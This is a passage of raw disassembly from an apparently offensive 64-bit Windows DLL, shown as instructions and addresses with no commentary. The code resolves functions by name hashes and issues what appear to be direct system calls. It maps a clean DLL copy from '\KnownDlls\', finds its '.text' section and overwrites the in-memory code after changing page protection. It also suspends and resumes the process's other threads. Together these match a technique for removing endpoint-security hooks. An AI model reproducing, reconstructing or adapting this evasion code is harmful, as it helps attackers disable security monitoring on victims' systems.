   1800033e7:	41 b1 01             	mov    $0x1,%r9b
   1800033ea:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   1800033ef:	41 8d 48 01          	lea    0x1(%r8),%ecx
   1800033f3:	ff 15 77 1c 00 00    	call   *0x1c77(%rip)        # 0x180005070
   1800033f9:	85 c0                	test   %eax,%eax
   1800033fb:	78 40                	js     0x18000343d
   1800033fd:	48 8d 94 24 b8 00 00 	lea    0xb8(%rsp),%rdx
   180003404:	00 
   180003405:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   18000340b:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   180003410:	4c 8d 84 24 a8 00 00 	lea    0xa8(%rsp),%r8
   180003417:	00 
   180003418:	48 8d 54 24 68       	lea    0x68(%rsp),%rdx
   18000341d:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   180003424:	ff 15 2e 1c 00 00    	call   *0x1c2e(%rip)        # 0x180005058
   18000342a:	85 c0                	test   %eax,%eax
   18000342c:	78 0f                	js     0x18000343d
   18000342e:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   180003433:	b8 01 00 00 00       	mov    $0x1,%eax
   180003438:	48 89 0e             	mov    %rcx,(%rsi)
   18000343b:	eb 02                	jmp    0x18000343f
   18000343d:	33 c0                	xor    %eax,%eax
   18000343f:	48 8b 9c 24 a0 00 00 	mov    0xa0(%rsp),%rbx
   180003446:	00 
   180003447:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   18000344e:	5f                   	pop    %rdi
   18000344f:	5e                   	pop    %rsi
   180003450:	5d                   	pop    %rbp
   180003451:	c3                   	ret
   180003452:	cc                   	int3
   180003453:	cc                   	int3
   180003454:	cc                   	int3
   180003455:	cc                   	int3
   180003456:	cc                   	int3
   180003457:	cc                   	int3
   180003458:	cc                   	int3
   180003459:	cc                   	int3
   18000345a:	cc                   	int3
   18000345b:	cc                   	int3
   18000345c:	cc                   	int3
   18000345d:	cc                   	int3
   18000345e:	cc                   	int3
   18000345f:	cc                   	int3
   180003460:	4c 8b dc             	mov    %rsp,%r11
   180003463:	49 89 5b 08          	mov    %rbx,0x8(%r11)
   180003467:	57                   	push   %rdi
   180003468:	48 83 ec 60          	sub    $0x60,%rsp
   18000346c:	33 db                	xor    %ebx,%ebx
   18000346e:	48 8d 05 bb fc ff ff 	lea    -0x345(%rip),%rax        # 0x180003130
   180003475:	49 89 5b e8          	mov    %rbx,-0x18(%r11)
   180003479:	48 8b f9             	mov    %rcx,%rdi
   18000347c:	49 89 5b e0          	mov    %rbx,-0x20(%r11)
   180003480:	49 8d 4b 10          	lea    0x10(%r11),%rcx
   180003484:	49 89 5b d8          	mov    %rbx,-0x28(%r11)
   180003488:	45 33 c0             	xor    %r8d,%r8d
   18000348b:	49 89 5b d0          	mov    %rbx,-0x30(%r11)
   18000348f:	4c 8d 4b ff          	lea    -0x1(%rbx),%r9
   180003493:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   180003497:	ba ff ff 1f 00       	mov    $0x1fffff,%edx
   18000349c:	49 89 5b c0          	mov    %rbx,-0x40(%r11)
   1800034a0:	49 89 43 b8          	mov    %rax,-0x48(%r11)
   1800034a4:	49 89 5b 10          	mov    %rbx,0x10(%r11)
   1800034a8:	ff 15 b2 1b 00 00    	call   *0x1bb2(%rip)        # 0x180005060
   1800034ae:	85 c0                	test   %eax,%eax
   1800034b0:	78 47                	js     0x1800034f9
   1800034b2:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   1800034b7:	45 33 c9             	xor    %r9d,%r9d
   1800034ba:	45 33 c0             	xor    %r8d,%r8d
   1800034bd:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   1800034c1:	48 8b d7             	mov    %rdi,%rdx
   1800034c4:	ff 15 9e 1b 00 00    	call   *0x1b9e(%rip)        # 0x180005068
   1800034ca:	85 c0                	test   %eax,%eax
   1800034cc:	78 2b                	js     0x1800034f9
   1800034ce:	41 b1 01             	mov    $0x1,%r9b
   1800034d1:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1800034d6:	45 33 c0             	xor    %r8d,%r8d
   1800034d9:	48 8d 54 24 78       	lea    0x78(%rsp),%rdx
   1800034de:	8d 4b 01             	lea    0x1(%rbx),%ecx
   1800034e1:	ff 15 89 1b 00 00    	call   *0x1b89(%rip)        # 0x180005070
   1800034e7:	85 c0                	test   %eax,%eax
   1800034e9:	0f 99 c3             	setns  %bl
   1800034ec:	8b c3                	mov    %ebx,%eax
   1800034ee:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   1800034f3:	48 83 c4 60          	add    $0x60,%rsp
   1800034f7:	5f                   	pop    %rdi
   1800034f8:	c3                   	ret
   1800034f9:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   1800034fe:	33 c0                	xor    %eax,%eax
   180003500:	48 83 c4 60          	add    $0x60,%rsp
   180003504:	5f                   	pop    %rdi
   180003505:	c3                   	ret
   180003506:	cc                   	int3
   180003507:	cc                   	int3
   180003508:	cc                   	int3
   180003509:	cc                   	int3
   18000350a:	cc                   	int3
   18000350b:	cc                   	int3
   18000350c:	cc                   	int3
   18000350d:	cc                   	int3
   18000350e:	cc                   	int3
   18000350f:	cc                   	int3
   180003510:	48 83 ec 28          	sub    $0x28,%rsp
   180003514:	48 8d 15 85 1b 00 00 	lea    0x1b85(%rip),%rdx        # 0x1800050a0
   18000351b:	b9 9a df e1 a1       	mov    $0xa1e1df9a,%ecx
   180003520:	e8 eb f7 ff ff       	call   0x180002d10
   180003525:	85 c0                	test   %eax,%eax
   180003527:	0f 84 ba 00 00 00    	je     0x1800035e7
   18000352d:	48 8d 15 84 1b 00 00 	lea    0x1b84(%rip),%rdx        # 0x1800050b8
   180003534:	b9 17 da 93 e4       	mov    $0xe493da17,%ecx
   180003539:	e8 d2 f7 ff ff       	call   0x180002d10
   18000353e:	85 c0                	test   %eax,%eax
   180003540:	0f 84 a1 00 00 00    	je     0x1800035e7
   180003546:	48 8d 15 83 1b 00 00 	lea    0x1b83(%rip),%rdx        # 0x1800050d0
   18000354d:	b9 23 9e aa 84       	mov    $0x84aa9e23,%ecx
   180003552:	e8 b9 f7 ff ff       	call   0x180002d10
   180003557:	85 c0                	test   %eax,%eax
   180003559:	0f 84 88 00 00 00    	je     0x1800035e7
   18000355f:	48 8d 15 82 1b 00 00 	lea    0x1b82(%rip),%rdx        # 0x1800050e8
   180003566:	b9 ce d2 a7 e7       	mov    $0xe7a7d2ce,%ecx
   18000356b:	e8 a0 f7 ff ff       	call   0x180002d10
   180003570:	85 c0                	test   %eax,%eax
   180003572:	74 73                	je     0x1800035e7
   180003574:	48 8d 15 85 1b 00 00 	lea    0x1b85(%rip),%rdx        # 0x180005100
   18000357b:	b9 5b 40 1b 80       	mov    $0x801b405b,%ecx
   180003580:	e8 8b f7 ff ff       	call   0x180002d10
   180003585:	85 c0                	test   %eax,%eax
   180003587:	74 5e                	je     0x1800035e7
   180003589:	48 8d 15 88 1b 00 00 	lea    0x1b88(%rip),%rdx        # 0x180005118
   180003590:	b9 f8 a0 7b 1e       	mov    $0x1e7ba0f8,%ecx
   180003595:	e8 76 f7 ff ff       	call   0x180002d10
   18000359a:	85 c0                	test   %eax,%eax
   18000359c:	74 49                	je     0x1800035e7
   18000359e:	48 8d 15 8b 1b 00 00 	lea    0x1b8b(%rip),%rdx        # 0x180005130
   1800035a5:	b9 73 ec 74 62       	mov    $0x6274ec73,%ecx
   1800035aa:	e8 61 f7 ff ff       	call   0x180002d10
   1800035af:	85 c0                	test   %eax,%eax
   1800035b1:	74 34                	je     0x1800035e7
   1800035b3:	48 8d 15 8e 1b 00 00 	lea    0x1b8e(%rip),%rdx        # 0x180005148
   1800035ba:	b9 3c 2d 1f ea       	mov    $0xea1f2d3c,%ecx
   1800035bf:	e8 4c f7 ff ff       	call   0x180002d10
   1800035c4:	85 c0                	test   %eax,%eax
   1800035c6:	74 1f                	je     0x1800035e7
   1800035c8:	48 8d 15 91 1b 00 00 	lea    0x1b91(%rip),%rdx        # 0x180005160
   1800035cf:	b9 9f d5 2c 9e       	mov    $0x9e2cd59f,%ecx
   1800035d4:	e8 37 f7 ff ff       	call   0x180002d10
   1800035d9:	33 c9                	xor    %ecx,%ecx
   1800035db:	85 c0                	test   %eax,%eax
   1800035dd:	0f 95 c1             	setne  %cl
   1800035e0:	8b c1                	mov    %ecx,%eax
   1800035e2:	48 83 c4 28          	add    $0x28,%rsp
   1800035e6:	c3                   	ret
   1800035e7:	33 c0                	xor    %eax,%eax
   1800035e9:	48 83 c4 28          	add    $0x28,%rsp
   1800035ed:	c3                   	ret
   1800035ee:	cc                   	int3
   1800035ef:	cc                   	int3
   1800035f0:	40 55                	rex push %rbp
   1800035f2:	53                   	push   %rbx
   1800035f3:	56                   	push   %rsi
   1800035f4:	57                   	push   %rdi
   1800035f5:	41 54                	push   %r12
   1800035f7:	41 55                	push   %r13
   1800035f9:	41 56                	push   %r14
   1800035fb:	41 57                	push   %r15
   1800035fd:	48 8d ac 24 38 fc ff 	lea    -0x3c8(%rsp),%rbp
   180003604:	ff 
   180003605:	48 81 ec c8 04 00 00 	sub    $0x4c8,%rsp
   18000360c:	65 48 8b 04 25 60 00 	mov    %gs:0x60,%rax
   180003613:	00 00 
   180003615:	48 85 c0             	test   %rax,%rax
   180003618:	0f 84 57 03 00 00    	je     0x180003975
   18000361e:	83 b8 18 01 00 00 0a 	cmpl   $0xa,0x118(%rax)
   180003625:	0f 85 4a 03 00 00    	jne    0x180003975
   18000362b:	45 33 ed             	xor    %r13d,%r13d
   18000362e:	33 c9                	xor    %ecx,%ecx
   180003630:	44 89 ad 10 04 00 00 	mov    %r13d,0x410(%rbp)
   180003637:	41 8b fd             	mov    %r13d,%edi
   18000363a:	4c 8b 60 18          	mov    0x18(%rax),%r12
   18000363e:	45 8b f5             	mov    %r13d,%r14d
   180003641:	49 8b 44 24 20       	mov    0x20(%r12),%rax
   180003646:	49 83 c4 20          	add    $0x20,%r12
   18000364a:	45 8b fd             	mov    %r13d,%r15d
   18000364d:	48 8b 30             	mov    (%rax),%rsi
   180003650:	e8 3b 03 00 00       	call   0x180003990
   180003655:	85 c0                	test   %eax,%eax
   180003657:	0f 84 18 03 00 00    	je     0x180003975
   18000365d:	49 3b f4             	cmp    %r12,%rsi
   180003660:	0f 84 fa 02 00 00    	je     0x180003960
   180003666:	48 8b 4e 50          	mov    0x50(%rsi),%rcx
   18000366a:	e8 51 06 00 00       	call   0x180003cc0
   18000366f:	3d 12 0b af 1c       	cmp    $0x1caf0b12,%eax
   180003674:	0f 84 da 02 00 00    	je     0x180003954
   18000367a:	48 8b 4e 50          	mov    0x50(%rsi),%rcx
   18000367e:	e8 3d 06 00 00       	call   0x180003cc0
   180003683:	3d da 2b f1 27       	cmp    $0x27f12bda,%eax
   180003688:	0f 84 c6 02 00 00    	je     0x180003954
   18000368e:	48 8b 5e 50          	mov    0x50(%rsi),%rbx
   180003692:	48 8d 8d b0 01 00 00 	lea    0x1b0(%rbp),%rcx
   180003699:	0f 57 c0             	xorps  %xmm0,%xmm0
   18000369c:	4c 89 ad 20 04 00 00 	mov    %r13,0x420(%rbp)
   1800036a3:	33 d2                	xor    %edx,%edx
   1800036a5:	4c 89 ad 18 04 00 00 	mov    %r13,0x418(%rbp)
   1800036ac:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   1800036b2:	4c 89 6c 24 58       	mov    %r13,0x58(%rsp)
   1800036b7:	0f 11 44 24 60       	movups %xmm0,0x60(%rsp)
   1800036bc:	44 89 6c 24 74       	mov    %r13d,0x74(%rsp)
   1800036c1:	44 89 6d 8c          	mov    %r13d,-0x74(%rbp)
   1800036c5:	e8 16 f6 ff ff       	call   0x180002ce0
   1800036ca:	b9 5c 00 00 00       	mov    $0x5c,%ecx
   1800036cf:	c7 45 a0 5c 00 4b 00 	movl   $0x4b005c,-0x60(%rbp)
   1800036d6:	66 89 4d b4          	mov    %cx,-0x4c(%rbp)
   1800036da:	33 d2                	xor    %edx,%edx
   1800036dc:	48 8d 4d b6          	lea    -0x4a(%rbp),%rcx
   1800036e0:	c7 45 a4 6e 00 6f 00 	movl   $0x6f006e,-0x5c(%rbp)
   1800036e7:	41 b8 f2 01 00 00    	mov    $0x1f2,%r8d
   1800036ed:	c7 45 a8 77 00 6e 00 	movl   $0x6e0077,-0x58(%rbp)
   1800036f4:	c7 45 ac 44 00 6c 00 	movl   $0x6c0044,-0x54(%rbp)
   1800036fb:	c7 45 b0 6c 00 73 00 	movl   $0x73006c,-0x50(%rbp)
   180003702:	e8 d9 f5 ff ff       	call   0x180002ce0
   180003707:	48 8d 55 a0          	lea    -0x60(%rbp),%rdx
   18000370b:	48 8d 8d b0 01 00 00 	lea    0x1b0(%rbp),%rcx
   180003712:	e8 19 07 00 00       	call   0x180003e30
   180003717:	48 8b d3             	mov    %rbx,%rdx
   18000371a:	48 8d 8d b0 01 00 00 	lea    0x1b0(%rbp),%rcx
   180003721:	e8 ba 06 00 00       	call   0x180003de0
   180003726:	48 8d 95 b0 01 00 00 	lea    0x1b0(%rbp),%rdx
   18000372d:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   180003732:	e8 39 06 00 00       	call   0x180003d70
   180003737:	48 8b 15 72 19 00 00 	mov    0x1972(%rip),%rdx        # 0x1800050b0
   18000373e:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   180003743:	8b 0d 5b 19 00 00    	mov    0x195b(%rip),%ecx        # 0x1800050a4
   180003749:	0f 57 c0             	xorps  %xmm0,%xmm0
   18000374c:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   180003750:	f3 0f 7f 45 90       	movdqu %xmm0,-0x70(%rbp)
   180003755:	c7 44 24 70 30 00 00 	movl   $0x30,0x70(%rsp)
   18000375c:	00 
   18000375d:	4c 89 6c 24 78       	mov    %r13,0x78(%rsp)
   180003762:	c7 45 88 40 00 00 00 	movl   $0x40,-0x78(%rbp)
   180003769:	e8 02 07 00 00       	call   0x180003e70
   18000376e:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   180003773:	ba 04 00 00 00       	mov    $0x4,%edx
   180003778:	48 8d 8d 18 04 00 00 	lea    0x418(%rbp),%rcx
   18000377f:	e8 fa 06 00 00       	call   0x180003e7e
   180003784:	85 c0                	test   %eax,%eax
   180003786:	0f 88 c8 01 00 00    	js     0x180003954
   18000378c:	48 8b 15 4d 19 00 00 	mov    0x194d(%rip),%rdx        # 0x1800050e0
   180003793:	8b 0d 3b 19 00 00    	mov    0x193b(%rip),%ecx        # 0x1800050d4
   180003799:	e8 d2 06 00 00       	call   0x180003e70
   18000379e:	48 8b 8d 18 04 00 00 	mov    0x418(%rbp),%rcx
   1800037a5:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   1800037aa:	c7 44 24 48 02 00 00 	movl   $0x2,0x48(%rsp)
   1800037b1:	00 
   1800037b2:	4c 8d 85 20 04 00 00 	lea    0x420(%rbp),%r8
   1800037b9:	4c 89 6c 24 40       	mov    %r13,0x40(%rsp)
   1800037be:	45 33 c9             	xor    %r9d,%r9d
   1800037c1:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%rsp)
   1800037c8:	00 
   1800037c9:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1800037ce:	4c 89 6c 24 28       	mov    %r13,0x28(%rsp)
   1800037d3:	49 8d 51 ff          	lea    -0x1(%r9),%rdx
   1800037d7:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   1800037dc:	e8 9d 06 00 00       	call   0x180003e7e
   1800037e1:	85 c0                	test   %eax,%eax
   1800037e3:	0f 88 6b 01 00 00    	js     0x180003954
   1800037e9:	48 8b 9d 20 04 00 00 	mov    0x420(%rbp),%rbx
   1800037f0:	48 85 db             	test   %rbx,%rbx
   1800037f3:	0f 84 5b 01 00 00    	je     0x180003954
   1800037f9:	4c 8b 46 20          	mov    0x20(%rsi),%r8
   1800037fd:	4d 85 c0             	test   %r8,%r8
   180003800:	0f 84 4e 01 00 00    	je     0x180003954
   180003806:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   18000380b:	66 41 39 00          	cmp    %ax,(%r8)
   18000380f:	0f 85 60 01 00 00    	jne    0x180003975
   180003815:	49 63 48 3c          	movslq 0x3c(%r8),%rcx
   180003819:	49 03 c8             	add    %r8,%rcx
   18000381c:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   180003822:	0f 85 4d 01 00 00    	jne    0x180003975
   180003828:	0f b7 51 06          	movzwl 0x6(%rcx),%edx
   18000382c:	48 85 d2             	test   %rdx,%rdx
   18000382f:	74 38                	je     0x180003869
   180003831:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   180003835:	48 83 c0 24          	add    $0x24,%rax
   180003839:	48 03 c1             	add    %rcx,%rax
   18000383c:	0f 1f 40 00          	nopl   0x0(%rax)
   180003840:	8b 48 f4             	mov    -0xc(%rax),%ecx
   180003843:	81 c9 20 20 20 20    	or     $0x20202020,%ecx
   180003849:	81 f9 2e 74 65 78    	cmp    $0x7865742e,%ecx
   18000384f:	75 0e                	jne    0x18000385f
   180003851:	8b 08                	mov    (%rax),%ecx
   180003853:	44 8b 78 fc          	mov    -0x4(%rax),%r15d
   180003857:	4a 8d 3c 01          	lea    (%rcx,%r8,1),%rdi
   18000385b:	4c 8d 34 19          	lea    (%rcx,%rbx,1),%r14
   18000385f:	48 83 c0 28          	add    $0x28,%rax
   180003863:	48 83 ea 01          	sub    $0x1,%rdx
   180003867:	75 d7                	jne    0x180003840
   180003869:	4d 85 ff             	test   %r15,%r15
   18000386c:	0f 84 03 01 00 00    	je     0x180003975
   180003872:	48 85 ff             	test   %rdi,%rdi
   180003875:	0f 84 fa 00 00 00    	je     0x180003975
   18000387b:	4d 85 f6             	test   %r14,%r14
   18000387e:	0f 84 f1 00 00 00    	je     0x180003975
   180003884:	49 8b 06             	mov    (%r14),%rax
   180003887:	48 39 07             	cmp    %rax,(%rdi)
   18000388a:	0f 85 e5 00 00 00    	jne    0x180003975
   180003890:	48 8b 15 79 18 00 00 	mov    0x1879(%rip),%rdx        # 0x180005110
   180003897:	8b 0d 67 18 00 00    	mov    0x1867(%rip),%ecx        # 0x180005104
   18000389d:	48 89 7c 24 50       	mov    %rdi,0x50(%rsp)
   1800038a2:	4c 89 bd 28 04 00 00 	mov    %r15,0x428(%rbp)
   1800038a9:	e8 c2 05 00 00       	call   0x180003e70
   1800038ae:	48 8d 85 10 04 00 00 	lea    0x410(%rbp),%rax
   1800038b5:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   1800038bb:	4c 8d 85 28 04 00 00 	lea    0x428(%rbp),%r8
   1800038c2:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1800038c7:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1800038cc:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   1800038d3:	e8 a6 05 00 00       	call   0x180003e7e
   1800038d8:	85 c0                	test   %eax,%eax
   1800038da:	0f 88 95 00 00 00    	js     0x180003975
   1800038e0:	4d 8b c7             	mov    %r15,%r8
   1800038e3:	49 8b d6             	mov    %r14,%rdx
   1800038e6:	48 8b cf             	mov    %rdi,%rcx
   1800038e9:	e8 c2 04 00 00       	call   0x180003db0
   1800038ee:	48 8b 15 1b 18 00 00 	mov    0x181b(%rip),%rdx        # 0x180005110
   1800038f5:	8b 0d 09 18 00 00    	mov    0x1809(%rip),%ecx        # 0x180005104
   1800038fb:	e8 70 05 00 00       	call   0x180003e70
   180003900:	44 8b 8d 10 04 00 00 	mov    0x410(%rbp),%r9d
   180003907:	48 8d 85 10 04 00 00 	lea    0x410(%rbp),%rax
   18000390e:	4c 8d 85 28 04 00 00 	lea    0x428(%rbp),%r8
   180003915:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000391a:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   18000391f:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   180003926:	e8 53 05 00 00       	call   0x180003e7e
   18000392b:	85 c0                	test   %eax,%eax
   18000392d:	78 46                	js     0x180003975
   18000392f:	48 8b 15 c2 17 00 00 	mov    0x17c2(%rip),%rdx        # 0x1800050f8
   180003936:	8b 0d b0 17 00 00    	mov    0x17b0(%rip),%ecx        # 0x1800050ec
   18000393c:	e8 2f 05 00 00       	call   0x180003e70
   180003941:	48 8b d3             	mov    %rbx,%rdx
   180003944:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   18000394b:	e8 2e 05 00 00       	call   0x180003e7e
   180003950:	85 c0                	test   %eax,%eax
   180003952:	78 21                	js     0x180003975
   180003954:	48 8b 36             	mov    (%rsi),%rsi
   180003957:	49 3b f4             	cmp    %r12,%rsi
   18000395a:	0f 85 06 fd ff ff    	jne    0x180003666
   180003960:	b9 01 00 00 00       	mov    $0x1,%ecx
   180003965:	e8 26 00 00 00       	call   0x180003990
   18000396a:	85 c0                	test   %eax,%eax
   18000396c:	74 07                	je     0x180003975
   18000396e:	b8 01 00 00 00       	mov    $0x1,%eax
   180003973:	eb 02                	jmp    0x180003977
   180003975:	33 c0                	xor    %eax,%eax
   180003977:	48 81 c4 c8 04 00 00 	add    $0x4c8,%rsp
   18000397e:	41 5f                	pop    %r15
   180003980:	41 5e                	pop    %r14
   180003982:	41 5d                	pop    %r13
   180003984:	41 5c                	pop    %r12
   180003986:	5f                   	pop    %rdi
   180003987:	5e                   	pop    %rsi
   180003988:	5b                   	pop    %rbx
   180003989:	5d                   	pop    %rbp
   18000398a:	c3                   	ret
   18000398b:	cc                   	int3
   18000398c:	cc                   	int3
   18000398d:	cc                   	int3
   18000398e:	cc                   	int3
   18000398f:	cc                   	int3
   180003990:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003995:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000399a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   18000399f:	55                   	push   %rbp
   1800039a0:	41 56                	push   %r14
   1800039a2:	41 57                	push   %r15
   1800039a4:	48 8b ec             	mov    %rsp,%rbp
   1800039a7:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   1800039ae:	65 48 8b 34 25 40 00 	mov    %gs:0x40,%rsi
   1800039b5:	00 00 
   1800039b7:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800039ba:	65 4c 8b 34 25 48 00 	mov    %gs:0x48,%r14
   1800039c1:	00 00 
   1800039c3:	45 33 ff             	xor    %r15d,%r15d
   1800039c6:	33 d2                	xor    %edx,%edx
   1800039c8:	4c 89 7d 28          	mov    %r15,0x28(%rbp)
   1800039cc:	8b f9                	mov    %ecx,%edi
   1800039ce:	48 c7 45 b0 1c 00 00 	movq   $0x1c,-0x50(%rbp)
   1800039d5:	00 
   1800039d6:	4c 89 7d b8          	mov    %r15,-0x48(%rbp)
   1800039da:	4c 89 7d c0          	mov    %r15,-0x40(%rbp)
   1800039de:	8d 4a 04             	lea    0x4(%rdx),%ecx
   1800039e1:	44 89 7d c8          	mov    %r15d,-0x38(%rbp)
   1800039e5:	0f 11 45 d0          	movups %xmm0,-0x30(%rbp)
   1800039e9:	0f 11 45 e0          	movups %xmm0,-0x20(%rbp)
   1800039ed:	0f 11 45 f0          	movups %xmm0,-0x10(%rbp)
   1800039f1:	0f 11 45 a0          	movups %xmm0,-0x60(%rbp)
   1800039f5:	ff 15 85 16 00 00    	call   *0x1685(%rip)        # 0x180005080
   1800039fb:	48 8b d8             	mov    %rax,%rbx
   1800039fe:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   180003a02:	75 10                	jne    0x180003a14
   180003a04:	48 8b c8             	mov    %rax,%rcx
   180003a07:	ff 15 8b 16 00 00    	call   *0x168b(%rip)        # 0x180005098
   180003a0d:	33 c0                	xor    %eax,%eax
   180003a0f:	e9 00 01 00 00       	jmp    0x180003b14
   180003a14:	48 8d 55 b0          	lea    -0x50(%rbp),%rdx
   180003a18:	48 8b cb             	mov    %rbx,%rcx
   180003a1b:	ff 15 67 16 00 00    	call   *0x1667(%rip)        # 0x180005088
   180003a21:	85 c0                	test   %eax,%eax
   180003a23:	75 10                	jne    0x180003a35
   180003a25:	48 8b cb             	mov    %rbx,%rcx
   180003a28:	ff 15 6a 16 00 00    	call   *0x166a(%rip)        # 0x180005098
   180003a2e:	33 c0                	xor    %eax,%eax
   180003a30:	e9 df 00 00 00       	jmp    0x180003b14
   180003a35:	8b 45 bc             	mov    -0x44(%rbp),%eax
   180003a38:	3b c6                	cmp    %esi,%eax
   180003a3a:	0f 85 b1 00 00 00    	jne    0x180003af1
   180003a40:	8b 4d b8             	mov    -0x48(%rbp),%ecx
   180003a43:	41 3b ce             	cmp    %r14d,%ecx
   180003a46:	0f 84 a5 00 00 00    	je     0x180003af1
   180003a4c:	48 8b 15 d5 16 00 00 	mov    0x16d5(%rip),%rdx        # 0x180005128
   180003a53:	0f 57 c0             	xorps  %xmm0,%xmm0
   180003a56:	48 89 4d a8          	mov    %rcx,-0x58(%rbp)
   180003a5a:	8b 0d bc 16 00 00    	mov    0x16bc(%rip),%ecx        # 0x18000511c
   180003a60:	f3 0f 7f 45 f0       	movdqu %xmm0,-0x10(%rbp)
   180003a65:	c7 45 d0 30 00 00 00 	movl   $0x30,-0x30(%rbp)
   180003a6c:	4c 89 7d d8          	mov    %r15,-0x28(%rbp)
   180003a70:	44 89 7d e8          	mov    %r15d,-0x18(%rbp)
   180003a74:	4c 89 7d e0          	mov    %r15,-0x20(%rbp)
   180003a78:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
   180003a7c:	e8 ef 03 00 00       	call   0x180003e70
   180003a81:	4c 8d 4d a0          	lea    -0x60(%rbp),%r9
   180003a85:	ba 00 00 00 10       	mov    $0x10000000,%edx
   180003a8a:	4c 8d 45 d0          	lea    -0x30(%rbp),%r8
   180003a8e:	48 8d 4d 28          	lea    0x28(%rbp),%rcx
   180003a92:	e8 e7 03 00 00       	call   0x180003e7e
   180003a97:	85 ff                	test   %edi,%edi
   180003a99:	75 0f                	jne    0x180003aaa
   180003a9b:	48 8b 15 9e 16 00 00 	mov    0x169e(%rip),%rdx        # 0x180005140
   180003aa2:	8b 0d 8c 16 00 00    	mov    0x168c(%rip),%ecx        # 0x180005134
   180003aa8:	eb 12                	jmp    0x180003abc
   180003aaa:	83 ff 01             	cmp    $0x1,%edi
   180003aad:	75 22                	jne    0x180003ad1
   180003aaf:	48 8b 15 a2 16 00 00 	mov    0x16a2(%rip),%rdx        # 0x180005158
   180003ab6:	8b 0d 90 16 00 00    	mov    0x1690(%rip),%ecx        # 0x18000514c
   180003abc:	e8 af 03 00 00       	call   0x180003e70
   180003ac1:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   180003ac5:	48 85 c9             	test   %rcx,%rcx
   180003ac8:	74 07                	je     0x180003ad1
   180003aca:	33 d2                	xor    %edx,%edx
   180003acc:	e8 ad 03 00 00       	call   0x180003e7e
   180003ad1:	48 8b 15 98 16 00 00 	mov    0x1698(%rip),%rdx        # 0x180005170
   180003ad8:	8b 0d 86 16 00 00    	mov    0x1686(%rip),%ecx        # 0x180005164
   180003ade:	e8 8d 03 00 00       	call   0x180003e70
   180003ae3:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   180003ae7:	48 85 c9             	test   %rcx,%rcx
   180003aea:	74 05                	je     0x180003af1
   180003aec:	e8 8d 03 00 00       	call   0x180003e7e
   180003af1:	48 8d 55 b0          	lea    -0x50(%rbp),%rdx
   180003af5:	48 8b cb             	mov    %rbx,%rcx
   180003af8:	ff 15 92 15 00 00    	call   *0x1592(%rip)        # 0x180005090
   180003afe:	85 c0                	test   %eax,%eax
   180003b00:	0f 85 2f ff ff ff    	jne    0x180003a35
   180003b06:	48 8b cb             	mov    %rbx,%rcx
   180003b09:	ff 15 89 15 00 00    	call   *0x1589(%rip)        # 0x180005098
   180003b0f:	b8 01 00 00 00       	mov    $0x1,%eax
   180003b14:	4c 8d 9c 24 80 00 00 	lea    0x80(%rsp),%r11
   180003b1b:	00 
   180003b1c:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   180003b20:	49 8b 73 30          	mov    0x30(%r11),%rsi
   180003b24:	49 8b 7b 38          	mov    0x38(%r11),%rdi
   180003b28:	49 8b e3             	mov    %r11,%rsp
   180003b2b:	41 5f                	pop    %r15
   180003b2d:	41 5e                	pop    %r14
   180003b2f:	5d                   	pop    %rbp
   180003b30:	c3                   	ret
   180003b31:	cc                   	int3
   180003b32:	cc                   	int3
   180003b33:	cc                   	int3
   180003b34:	cc                   	int3
   180003b35:	cc                   	int3
   180003b36:	cc                   	int3
   180003b37:	cc                   	int3
   180003b38:	cc                   	int3
   180003b39:	cc                   	int3
   180003b3a:	cc                   	int3
   180003b3b:	cc                   	int3
   180003b3c:	cc                   	int3
   180003b3d:	cc                   	int3
   180003b3e:	cc                   	int3
   180003b3f:	cc                   	int3
   180003b40:	4c 8b d1             	mov    %rcx,%r10
   180003b43:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   180003b48:	0f b6 09             	movzbl (%rcx),%ecx
   180003b4b:	84 c9                	test   %cl,%cl
   180003b4d:	0f 84 16 01 00 00    	je     0x180003c69
   180003b53:	0f 1f 40 00          	nopl   0x0(%rax)
   180003b57:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   180003b5e:	00 00 
   180003b60:	0f b6 d1             	movzbl %cl,%edx
   180003b63:	4d 8d 52 01          	lea    0x1(%r10),%r10
   180003b67:	44 8b c2             	mov    %edx,%r8d
